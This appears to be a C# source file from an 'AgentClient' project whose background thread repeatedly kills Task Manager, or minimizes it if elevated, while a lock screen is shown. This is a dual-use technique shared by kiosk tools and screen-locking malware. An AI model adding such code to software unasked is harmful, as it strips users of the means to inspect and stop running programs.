using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace AgentClient
{
    /// <summary>
    /// Watches for Task Manager while lock screen is shown.
    /// Tries to kill/minimize it (when not elevated).
    /// </summary>
    public static class TaskManagerWatcher
    {
        private static Thread? _thread;
        private static CancellationTokenSource? _cts;

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_MINIMIZE = 6;

        public static void Start()
        {
            if (_thread != null) return;
            _cts = new CancellationTokenSource();
            _thread = new Thread(Loop) { IsBackground = true };
            _thread.Start(_cts.Token);
        }

        public static void Stop()
        {
            try { _cts?.Cancel(); } catch { }
            _thread = null;
            _cts = null;
        }

        private static void Loop(object? arg)
        {
            var token = (CancellationToken)arg!;
            while (!token.IsCancellationRequested)
            {
                try
                {
                    foreach (var p in Process.GetProcessesByName("Taskmgr"))
                    {
                        try
                        {
                            // First try: kill (works if same integrity level, not elevated)
                            p.Kill(entireProcessTree: true);
                        }
                        catch
                        {
                            // Fallback: minimize window (may fail for elevated)
                            try
                            {
                                if (p.MainWindowHandle != IntPtr.Zero)
                                    ShowWindow(p.MainWindowHandle, SW_MINIMIZE);
                            }
                            catch { /* ignore */ }
                        }
                    }
                }
                catch { /* ignore */ }

                Thread.Sleep(300);
            }
        }
    }
}
